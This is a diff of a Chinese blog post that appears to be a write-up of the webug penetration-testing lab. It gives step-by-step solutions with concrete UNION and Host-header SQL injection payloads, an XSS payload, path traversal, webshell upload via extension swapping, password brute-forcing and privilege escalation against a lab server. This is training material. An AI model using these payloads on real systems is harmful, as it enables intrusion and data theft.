@@ -79,20 +79,22 @@
 
 
 
-<meta name="description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
+<meta name="description" content="0x01 基础普通的GET注入一道简单的sql注入  暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="webug wp">
 <meta property="og:url" content="http://yoursite.com/2018/04/17/webug wp/index.html">
 <meta property="og:site_name" content="Hu3sky">
-<meta property="og:description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
+<meta property="og:description" content="0x01 基础普通的GET注入一道简单的sql注入  暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%2">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/ctf/1.png">
 <meta property="og:image" content="http://yoursite.com/ctf/2.png">
 <meta property="og:image" content="http://yoursite.com/ctf/盲注.png">
-<meta property="og:updated_time" content="2018-04-22T12:18:21.609Z">
+<meta property="og:image" content="http://yoursite.com/ctf/cms.png">
+<meta property="og:image" content="http://yoursite.com/ctf/sqlmap.png">
+<meta property="og:updated_time" content="2018-04-24T15:29:15.223Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="webug wp">
-<meta name="twitter:description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
+<meta name="twitter:description" content="0x01 基础普通的GET注入一道简单的sql注入  暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%2">
 <meta name="twitter:image" content="http://yoursite.com/ctf/1.png">
 
 
@@ -319,8 +321,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/webug-write-up/" itemprop="url" rel="index">
-                    <span itemprop="name">webug write up</span>
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
                   </a>
                 </span>
 
@@ -356,39 +358,30 @@
       
 
       
-        <h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><ol>
-<li>普通的GET注入<br>一道简单的sql注入</li>
-</ol>
+        <h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><h2 id="普通的GET注入"><a href="#普通的GET注入" class="headerlink" title="普通的GET注入"></a>普通的GET注入</h2><p>一道简单的sql注入</p>
 <ul>
 <li>暴库<code>http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+</code></li>
 <li>爆表<a href="http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=`pentesterlab`--+" target="_blank" rel="noopener">http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=`pentesterlab`--+</a><br>可以看到有个flag的表名。</li>
 <li>直接爆列名<code>http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27--+</code>有个flag的列</li>
 <li>获得flag <a href="http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,flag%20from%20`flag`--+" target="_blank" rel="noopener">http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,flag%20from%20`flag`--+</a></li>
 </ul>
-<ol>
-<li>从图片中你能找到什么<br>下载后改后缀为tar，发现一个txt文件，内容是 密码123</li>
-<li>你看到了什么<br>右键看源码，再御剑扫一下，就可以进入到一个页面，让我们md5加密目录</li>
-<li>告诉你了FLANG是5位数<br>用户名admin。burp爆破密码得到密码 admin123</li>
-<li>​</li>
-<li>这关需要RMB购买哦<br>emm。登陆密码在下一关。<br>抓包 直接改书的价格，小于余额就行了。</li>
-<li>越权<br>修改密码的时候可以改url处 将tom改为admin 然后对admin的密码进行修改，就可以直接登陆admin了</li>
-<li>跳转<br><code>http://222.18.158.245:6022/pentest/test/5/?url=www.baidu.com</code></li>
-<li>我系统密码忘记了<br>传个shell，连接到菜刀，看见conn.php，里面就是密码</li>
-<li>xss<br><code>http://222.18.158.245:6022/pentest/test/9/?id=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>
-<li>上传不了图片怎么办<br>上传一个shell 以jpg为后缀，抓包 改为php后缀。然后会有目录shell /upload/shell.php。菜刀连接</li>
-<li>明天双十一<br>首先改XFF，结果没什么用。。<br>由于之前连了菜刀，所以看一波源码<br>主要代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($url,&quot;www.taobao.com&quot;))&#123;</span><br><span class="line">		if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		echo &quot;剁手了,请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
+<p>##从图片中你能找到什么<br>下载后改后缀为tar，发现一个txt文件，内容是 密码123</p>
+<h2 id="你看到了什么"><a href="#你看到了什么" class="headerlink" title="你看到了什么"></a>你看到了什么</h2><p>右键看源码，再御剑扫一下，就可以进入到一个页面，让我们md5加密目录</p>
+<h2 id="告诉你了FLANG是5位数"><a href="#告诉你了FLANG是5位数" class="headerlink" title="告诉你了FLANG是5位数"></a>告诉你了FLANG是5位数</h2><p>用户名admin。burp爆破密码得到密码 admin123</p>
+<h2 id="管理员每天10点上线："><a href="#管理员每天10点上线：" class="headerlink" title="管理员每天10点上线："></a>管理员每天10点上线：</h2><p> ​</p>
+<h2 id="这关需要RMB购买哦"><a href="#这关需要RMB购买哦" class="headerlink" title="这关需要RMB购买哦"></a>这关需要RMB购买哦</h2><p>emm。登陆密码在下一关。<br>抓包 直接改书的价格，小于余额就行了。</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>修改密码的时候可以改url处 将tom改为admin 然后对admin的密码进行修改，就可以直接登陆admin了</p>
+<p>##跳转<br><code>http://222.18.158.245:6022/pentest/test/5/?url=www.baidu.com</code></p>
+<h2 id="我系统密码忘记了"><a href="#我系统密码忘记了" class="headerlink" title="我系统密码忘记了"></a>我系统密码忘记了</h2><p>传个shell，连接到菜刀，看见conn.php，里面就是密码</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p><code>http://222.18.158.245:6022/pentest/test/9/?id=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<h2 id="上传不了图片怎么办"><a href="#上传不了图片怎么办" class="headerlink" title="上传不了图片怎么办"></a>上传不了图片怎么办</h2><p>上传一个shell 以jpg为后缀，抓包 改为php后缀。然后会有目录shell /upload/shell.php。菜刀连接</p>
+<h2 id="明天双十一"><a href="#明天双十一" class="headerlink" title="明天双十一"></a>明天双十一</h2><p>首先改XFF，结果没什么用。。<br>由于之前连了菜刀，所以看一波源码<br>主要代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($url,&quot;www.taobao.com&quot;))&#123;</span><br><span class="line">		if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		echo &quot;剁手了,请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
 <p>抓包。改referer为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 改host为 10.10.10.10<br>得到flag</p>
-<h1 id="0x02-中级"><a href="#0x02-中级" class="headerlink" title="0x02 中级"></a>0x02 中级</h1><ol>
-<li>出来点东西吧<br>任意文件读取<br><a href="http://222.18.158.245:6022/pentest/test/13/../../../../index.php" target="_blank" rel="noopener">http://222.18.158.245:6022/pentest/test/13/../../../../index.php</a></li>
-<li>提交的方式怎么样啊<br>抓包 看到了提交方式为post</li>
-<li><img src="/ctf/1.png" alt="抓包"></li>
-</ol>
+<p>#0x02 中级</p>
+<h2 id="出来点东西吧"><a href="#出来点东西吧" class="headerlink" title="出来点东西吧"></a>出来点东西吧</h2><p>  任意文件读取<br>  <a href="http://222.18.158.245:6022/pentest/test/13/../../../../index.php" target="_blank" rel="noopener">http://222.18.158.245:6022/pentest/test/13/../../../../index.php</a></p>
+<h2 id="提交的方式怎么样啊"><a href="#提交的方式怎么样啊" class="headerlink" title="提交的方式怎么样啊"></a>提交的方式怎么样啊</h2><p>  抓包 看到了提交方式为post<br> <img src="/ctf/1.png" alt="抓包"></p>
 <p>改post处<br> <img src="/ctf/2.png" alt="抓包">看到 出现了index的首页</p>
-<ol>
-<li>我还是一个注入<br>在页面试了很久 没什么反应，所以应该不是url的普通注入或是盲注。<br>burpsuite抓包试试。本题是一个在host处的注入。</li>
-</ol>
+<h2 id="我还是一个注入"><a href="#我还是一个注入" class="headerlink" title="我还是一个注入"></a>我还是一个注入</h2><p>在页面试了很久 没什么反应，所以应该不是url的普通注入或是盲注。<br>burpsuite抓包试试。本题是一个在host处的注入。</p>
 <ul>
 <li>测试字段数：<br><code>Host: union select 1,2,3,4#</code></li>
 <li>数据库名称：<br><code>Host: union select 1,2,3,database()#</code></li>
@@ -396,15 +389,19 @@
 <li>列名：<br><code>Host: union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;#</code></li>
 <li>获取flag：<br>Host: union select 1,2,3,flag from `flag`#</li>
 </ul>
-<ol>
-<li>APK里面有flag<br>做不来做不来。看盛大佬的wp吧<br>我说下我是这么做的。。开了个鼠标连点器。。。毕竟只需要点300次嘛 强行get flag</li>
-<li><p>时间盲注<br>先判断database的长度<br><code>http://222.18.158.245:6022/pentest/test/time/?type=2 and length(database())=12 #</code><br>直接扔sqslmap跑就行了。。。<br><img src="/ctf/盲注.png" alt="盲注"></p>
-</li>
-<li><p>DZ论坛<br>这个页面太。。。</p>
-</li>
-<li>ASPCMS<br>404</li>
-<li>​</li>
-</ol>
+<h2 id="APK里面有flag"><a href="#APK里面有flag" class="headerlink" title="APK里面有flag"></a>APK里面有flag</h2><p>做不来做不来。看盛大佬的wp吧<br>我说下我是这么做的。。开了个鼠标连点器。。。毕竟只需要点300次嘛 强行get flag</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>先判断database的长度<br><code>http://222.18.158.245:6022/pentest/test/time/?type=2 and length(database())=12 #</code><br>直接扔sqslmap跑就行了。。。<br><img src="/ctf/盲注.png" alt="盲注"></p>
+<h2 id="DZ论坛"><a href="#DZ论坛" class="headerlink" title="DZ论坛"></a>DZ论坛</h2><p>这个页面太。。。</p>
+<h2 id="ASPCMS"><a href="#ASPCMS" class="headerlink" title="ASPCMS"></a>ASPCMS</h2><p>404</p>
+<h2 id="齐博系统"><a href="#齐博系统" class="headerlink" title="齐博系统"></a>齐博系统</h2><p>跳转实在是。。。</p>
+<p>##海盗云商<br>上传点在头像，但是我传不了。看了别人的getshell，是可以上传的，估计是题目的原因吧</p>
+<p>##PHP 168 6.0<br>又是跳转有问题 注册也没注册成功。</p>
+<h2 id="ECSHOP"><a href="#ECSHOP" class="headerlink" title="ECSHOP"></a>ECSHOP</h2><p>##SHOPXP系统V3.X<br>不存在</p>
+<h2 id="DCORE"><a href="#DCORE" class="headerlink" title="DCORE"></a>DCORE</h2><p>不存在</p>
+<p>##MetInfo任意文件包含<br>看了网上wp 都是说的访问这个目录<br><img src="/ctf/cms.png" alt="meta">结果什么也没有。。菜刀下又显示有这个文件。。。。不知道怎么回事</p>
+<p>##</p>
+<h1 id="实战扩展"><a href="#实战扩展" class="headerlink" title="实战扩展"></a>实战扩展</h1><h2 id="METINFO5-3"><a href="#METINFO5-3" class="headerlink" title="METINFO5.3"></a>METINFO5.3</h2><p>img.php 访问不了</p>
+<h2 id="万众电子期刊在线阅读系统PHP和ASP"><a href="#万众电子期刊在线阅读系统PHP和ASP" class="headerlink" title="万众电子期刊在线阅读系统PHP和ASP"></a>万众电子期刊在线阅读系统PHP和ASP</h2><p>搜索处，单引号测试，直接报错了，存在注入<br>扔进sqlmap，就直接跑出来了<br><img src="/ctf/sqlmap.png" alt="jieguo"></p>
 
       
     </div>
@@ -522,7 +519,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -568,7 +565,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-基础"><span class="nav-number">1.</span> <span class="nav-text">0x01 基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-中级"><span class="nav-number">2.</span> <span class="nav-text">0x02 中级</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-基础"><span class="nav-number">1.</span> <span class="nav-text">0x01 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#普通的GET注入"><span class="nav-number">1.1.</span> <span class="nav-text">普通的GET注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你看到了什么"><span class="nav-number">1.2.</span> <span class="nav-text">你看到了什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#告诉你了FLANG是5位数"><span class="nav-number">1.3.</span> <span class="nav-text">告诉你了FLANG是5位数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#管理员每天10点上线："><span class="nav-number">1.4.</span> <span class="nav-text">管理员每天10点上线：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这关需要RMB购买哦"><span class="nav-number">1.5.</span> <span class="nav-text">这关需要RMB购买哦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#越权"><span class="nav-number">1.6.</span> <span class="nav-text">越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我系统密码忘记了"><span class="nav-number">1.7.</span> <span class="nav-text">我系统密码忘记了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">1.8.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传不了图片怎么办"><span class="nav-number">1.9.</span> <span class="nav-text">上传不了图片怎么办</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#明天双十一"><span class="nav-number">1.10.</span> <span class="nav-text">明天双十一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出来点东西吧"><span class="nav-number">1.11.</span> <span class="nav-text">出来点东西吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提交的方式怎么样啊"><span class="nav-number">1.12.</span> <span class="nav-text">提交的方式怎么样啊</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我还是一个注入"><span class="nav-number">1.13.</span> <span class="nav-text">我还是一个注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#APK里面有flag"><span class="nav-number">1.14.</span> <span class="nav-text">APK里面有flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间盲注"><span class="nav-number">1.15.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DZ论坛"><span class="nav-number">1.16.</span> <span class="nav-text">DZ论坛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASPCMS"><span class="nav-number">1.17.</span> <span class="nav-text">ASPCMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#齐博系统"><span class="nav-number">1.18.</span> <span class="nav-text">齐博系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ECSHOP"><span class="nav-number">1.19.</span> <span class="nav-text">ECSHOP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCORE"><span class="nav-number">1.20.</span> <span class="nav-text">DCORE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战扩展"><span class="nav-number">2.</span> <span class="nav-text">实战扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#METINFO5-3"><span class="nav-number">2.1.</span> <span class="nav-text">METINFO5.3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#万众电子期刊在线阅读系统PHP和ASP"><span class="nav-number">2.2.</span> <span class="nav-text">万众电子期刊在线阅读系统PHP和ASP</span></a></li></ol></li></ol></div>
             
 
           </div>
